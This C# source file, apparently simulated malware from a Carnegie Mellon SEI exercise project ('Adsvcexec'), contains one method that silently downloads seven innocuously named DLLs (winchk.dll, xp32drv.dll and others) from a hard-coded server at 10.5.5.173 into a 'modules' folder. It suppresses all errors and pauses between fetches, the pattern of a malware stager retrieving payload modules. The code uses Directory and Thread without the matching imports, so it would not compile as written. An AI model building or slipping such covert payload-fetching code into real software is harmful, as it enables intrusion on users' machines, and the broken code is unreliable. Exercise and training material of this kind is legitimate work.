/*
Copyright 2023 Carnegie Mellon University.
Released under a MIT (SEI)-style license, please see LICENSE.md in the project 
root or contact permission@sei.cmu.edu for full terms.
*/

using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace Adsvcexec
{
    internal class Helpers
    {
        public void DownloadFeatures()
        {
            WebClient webClient = new WebClient();
            string url = string.Empty;
            string remoteUri = "http://10.5.5.173/";

            string fileName1 = "eugnxt.dll";
            string fileName2 = "nxtproc.dll";
            string fileName3 = "rstnop.dll";
            string fileName4 = "winchk.dll";
            string fileName5 = "udrvrs.dll";
            string fileName6 = "dnlton.dll";
            string fileName7 = "xp32drv.dll";

            if (!Directory.Exists(AppDomain.CurrentDomain.BaseDirectory + "\\modules"))
            {
                Directory.CreateDirectory(AppDomain.CurrentDomain.BaseDirectory + "\\modules");
            }

            try
            {
                url = remoteUri + fileName1;
                webClient.DownloadFile(url, AppDomain.CurrentDomain.BaseDirectory + "\\modules\\" + fileName1);
                Thread.Sleep(5000);
            }
            catch (Exception exc) { }

            try
            {
                url = remoteUri + fileName2;
                webClient.DownloadFile(url, AppDomain.CurrentDomain.BaseDirectory + "\\modules\\" + fileName2);
                Thread.Sleep(5000);
            }
            catch (Exception exc) { }

            try
            {
                url = remoteUri + fileName3;
                webClient.DownloadFile(url, AppDomain.CurrentDomain.BaseDirectory + "\\modules\\" + fileName3);
                Thread.Sleep(5000);
            }
            catch (Exception exc) { }

            try
            {
                url = remoteUri + fileName4;
                webClient.DownloadFile(url, AppDomain.CurrentDomain.BaseDirectory + "\\modules\\" + fileName4);
                Thread.Sleep(5000);
            }
            catch (Exception exc) { }

            try
            {
                url = remoteUri + fileName5;
                webClient.DownloadFile(url, AppDomain.CurrentDomain.BaseDirectory + "\\modules\\" + fileName5);
                Thread.Sleep(5000);
            }
            catch (Exception exc) { }

            try
            {
                url = remoteUri + fileName6;
                webClient.DownloadFile(url, AppDomain.CurrentDomain.BaseDirectory + "\\modules\\" + fileName6);
                Thread.Sleep(5000);
            }
            catch (Exception exc) { }

            try
            {
                url = remoteUri + fileName7;
                webClient.DownloadFile(url, AppDomain.CurrentDomain.BaseDirectory + "\\modules\\" + fileName7);
                Thread.Sleep(5000);
            }
            catch (Exception exc) { }
        }
    }
}

